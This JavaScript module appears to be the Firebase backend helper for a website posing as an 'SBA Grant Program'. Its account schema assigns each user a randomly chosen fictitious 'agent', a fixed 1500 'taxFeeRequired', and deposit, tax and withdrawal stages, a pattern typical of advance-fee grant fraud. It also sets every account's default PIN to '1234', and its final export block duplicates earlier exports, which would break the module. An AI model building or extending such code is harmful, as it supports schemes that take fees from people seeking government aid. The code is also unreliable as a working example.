/**
 * NOTIFICATION SETUP INSTRUCTIONS:
 *
 * 1. BROWSER PUSH NOTIFICATIONS (Firebase FCM — Free):
 *    - Go to Firebase Console → Project Settings → Cloud Messaging
 *    - Under "Web Push certificates", click "Generate key pair"
 *    - Copy the key and replace 'BM_YOUR_VAPID_KEY' below
 *    - Deploy firebase-messaging-sw.js to your site root
 *
 * 2. EMAIL NOTIFICATIONS (EmailJS — Free 200/month):
 *    - Create account at https://emailjs.com
 *    - Add a Gmail email service, note the Service ID
 *    - Create a template with these variables:
 *      {{to_email}}, {{to_name}}, {{subject}}, {{message}}, {{action_url}}
 *    - Copy your Public Key from Account → General
 *    - Replace the three values below
 */
export const EMAILJS_PUBLIC_KEY = 'YOUR_EMAILJS_PUBLIC_KEY';  // REPLACE
export const EMAILJS_SERVICE_ID = 'YOUR_SERVICE_ID';          // REPLACE
export const EMAILJS_TEMPLATE_ID = 'YOUR_TEMPLATE_ID';        // REPLACE
export const FCM_VAPID_KEY = 'YOUR_VAPID_KEY';                // REPLACE

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
    getAuth, onAuthStateChanged, signOut,
    createUserWithEmailAndPassword, signInWithEmailAndPassword,
    sendEmailVerification, sendPasswordResetEmail,
    updatePassword, reauthenticateWithCredential, EmailAuthProvider,
    browserLocalPersistence, setPersistence
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import {
    getFirestore, doc, getDoc, getDocs, setDoc, updateDoc, addDoc, deleteDoc,
    collection, query, where, orderBy, limit, onSnapshot,
    serverTimestamp, increment, arrayUnion, writeBatch
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import {
    getMessaging, getToken, onMessage
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging.js";

const firebaseConfig = {
    apiKey: "AIzaSyBB3VE9WQYX0fqM9ZmLSj3dR0-SQjpg0gY",
    authDomain: "sbagrant-b7e5d.firebaseapp.com",
    projectId: "sbagrant-b7e5d",
    storageBucket: "sbagrant-b7e5d.firebasestorage.app",
    messagingSenderId: "802243206422",
    appId: "1:802243206422:web:bbe74af7ce227092250437"
};

const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const db = getFirestore(app);
export const messaging = getMessaging(app);

setPersistence(auth, browserLocalPersistence).catch((error) => {
    console.error("Auth persistence error:", error);
});

export const ADMIN_EMAILS = ['sba.suppor@gmail.com', 'liger4683@gmail.com'];
export const AGENTS = [
    'Sarah Mitchell', 'James Caldwell', 'Diana Torres', 'Robert Hughes',
    'Patricia Wells', 'Michael Chen', 'Angela Davis', 'Thomas Brown'
];

export function isAdmin(email) {
    if (!email) return false;
    return ADMIN_EMAILS.includes(email.toLowerCase().trim());
}

export function getRandomAgent() {
    return AGENTS[Math.floor(Math.random() * AGENTS.length)];
}

export async function compressToBase64(file, maxWidth = 800, quality = 0.78) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (event) => {
            const img = new Image();
            img.src = event.target.result;
            img.onload = () => {
                const canvas = document.createElement('canvas');
                let width = img.width;
                let height = img.height;
                if (width > maxWidth) {
                    height = Math.round((height * maxWidth) / width);
                    width = maxWidth;
                }
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0, width, height);
                resolve(canvas.toDataURL('image/jpeg', quality));
            };
            img.onerror = (err) => reject(err);
        };
        reader.onerror = (err) => reject(err);
    });
}

export function buildNewUserPayload(data) {
    const admin = isAdmin(data.email);
    return {
        uid: data.uid,
        fullName: data.fullName || '',
        email: data.email || '',
        username: data.username || '',
        phoneNumber: data.phoneNumber || '',
        country: data.country || 'United States',
        gender: data.gender || '',
        dob: data.dob || '',
        avatarBase64: '',
        role: admin ? 'admin' : 'user',
        referredBy: data.referredBy || '',
        allocatedProgram: 'SBA Grant Program',
        assignedAgent: getRandomAgent(),
        kycStatus: 'IDLE',
        applyStatus: 'IDLE',
        depositStatus: 'IDLE',
        taxStatus: 'IDLE',
        withdrawStatus: 'IDLE',
        awardStatus: 'IDLE',
        balance: 0,
        requestedAmount: 0,
        totalAward: 0,
        taxFeeRequired: 1500,
        application: {},
        kyc: {},
        deposit: {},
        tax: {},
        withdrawal: {},
        transactionPin: '1234',
        accountStatus: 'active',
        fcmToken: '',
        emailNotifications: true,
        pushNotifications: true,
        isOnline: true,
        lastSeen: serverTimestamp(),
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp()
    };
}

export async function getUserData(uid) {
    try {
        const ref = doc(db, 'users', uid);
        const snap = await getDoc(ref);
        return snap.exists() ? snap.data() : null;
    } catch (e) {
        console.error("getUserData error:", e);
        return null;
    }
}

export function listenUserData(uid, callback) {
    const ref = doc(db, 'users', uid);
    return onSnapshot(ref, (snap) => {
        if (snap.exists()) {
            callback(snap.data());
        } else {
            callback(null);
        }
    }, (error) => {
        console.error("listenUserData error:", error);
    });
}

export async function updateUserData(uid, fields) {
    try {
        const ref = doc(db, 'users', uid);
        await updateDoc(ref, {
            ...fields,
            updatedAt: serverTimestamp()
        });
    } catch (e) {
        console.error("updateUserData error:", e);
        throw e;
    }
}

export async function setUserOnline(uid, status) {
    try {
        const ref = doc(db, 'users', uid);
        await updateDoc(ref, {
            isOnline: status,
            lastSeen: serverTimestamp()
        });
    } catch (e) {
        // Silent fail for presence updates
    }
}

export async function addLedgerEntry(uid, { type, amount, description, status, ref = '' }) {
    try {
        const colRef = collection(db, 'users', uid, 'ledger');
        await addDoc(colRef, {
            type,
            amount,
            description,
            status,
            ref,
            createdAt: serverTimestamp()
        });
    } catch (e) {
        console.error("addLedgerEntry error:", e);
    }
}

export async function logAdminAction(adminUid, adminEmail, action, targetUid, details = {}) {
    try {
        await addDoc(collection(db, 'auditLog'), {
            adminUid,
            adminEmail,
            action,
            targetUid,
            details,
            timestamp: serverTimestamp()
        });
    } catch (e) {
        console.error("logAdminAction error:", e);
    }
}

export async function notify(uid, { title, message, type = 'info', link = '', sendEmail = false }) {
    try {
        await addDoc(collection(db, 'notifications'), {
            uid,
            title,
            message,
            type,
            link,
            read: false,
            createdAt: serverTimestamp()
        });

        if (sendEmail && window.emailjs) {
            const userData = await getUserData(uid);
            if (userData && userData.email && userData.emailNotifications) {
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
                    to_email: userData.email,
                    to_name: userData.fullName || 'Valued User',
                    subject: title,
                    message: message,
                    action_url: window.location.origin + '/' + (link || 'dashboard.html')
                }, EMAILJS_PUBLIC_KEY);
            }
        }
    } catch (e) {
        console.error("notify error:", e);
    }
}

export async function notifyAdmins({ title, message, type = 'action', link = 'admin-portal.html' }) {
    try {
        await addDoc(collection(db, 'notifications'), {
            uid: 'ADMIN',
            title,
            message,
            type,
            link,
            read: false,
            createdAt: serverTimestamp()
        });
    } catch (e) {
        console.error("notifyAdmins error:", e);
    }
}

export async function markNotificationRead(notifId) {
    try {
        await updateDoc(doc(db, 'notifications', notifId), { read: true });
    } catch (e) {
        console.error("markNotificationRead error:", e);
    }
}

export async function markAllRead(uid) {
    try {
        const q = query(collection(db, 'notifications'), where('uid', 'in', [uid, 'ADMIN']), where('read', '==', false));
        const snap = await getDocs(q);
        const batch = writeBatch(db);
        snap.forEach((d) => {
            batch.update(d.ref, { read: true });
        });
        await batch.commit();
    } catch (e) {
        console.error("markAllRead error:", e);
    }
}

export async function requestNotificationPermission(uid) {
    try {
        const permission = await Notification.requestPermission();
        if (permission === 'granted') {
            const currentToken = await getToken(messaging, { vapidKey: FCM_VAPID_KEY });
            if (currentToken) {
                await updateUserData(uid, { fcmToken: currentToken });
            }
        }
    } catch (e) {
        // Silent fail for push permissions
    }
}

export function initForegroundMessages(onReceive) {
    onMessage(messaging, (payload) => {
        if (onReceive) onReceive(payload);
    });
}

export function saveRegStep(data) {
    const existing = getRegData();
    const merged = { ...existing, ...data };
    sessionStorage.setItem('SBA_REG', JSON.stringify(merged));
}

export function getRegData() {
    try {
        const val = sessionStorage.getItem('SBA_REG');
        return val ? JSON.parse(val) : {};
    } catch (e) {
        return {};
    }
}

export function clearRegData() {
    sessionStorage.removeItem('SBA_REG');
}

export async function sendEmailNotification({ toEmail, toName, subject, message, actionUrl }) {
    try {
        if (window.emailjs && EMAILJS_PUBLIC_KEY !== 'YOUR_EMAILJS_PUBLIC_KEY') {
            await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
                to_email: toEmail,
                to_name: toName,
                subject: subject,
                message: message,
                action_url: actionUrl
            }, EMAILJS_PUBLIC_KEY);
        }
    } catch (e) {
        // Silent fail
    }
}

export {
    auth, db, messaging,
    onAuthStateChanged, signOut,
    createUserWithEmailAndPassword, signInWithEmailAndPassword,
    sendEmailVerification, sendPasswordResetEmail,
    updatePassword, reauthenticateWithCredential, EmailAuthProvider,
    doc, getDoc, getDocs, setDoc, updateDoc, addDoc, deleteDoc,
    collection, query, where, orderBy, limit, onSnapshot,
    serverTimestamp, increment, arrayUnion
};
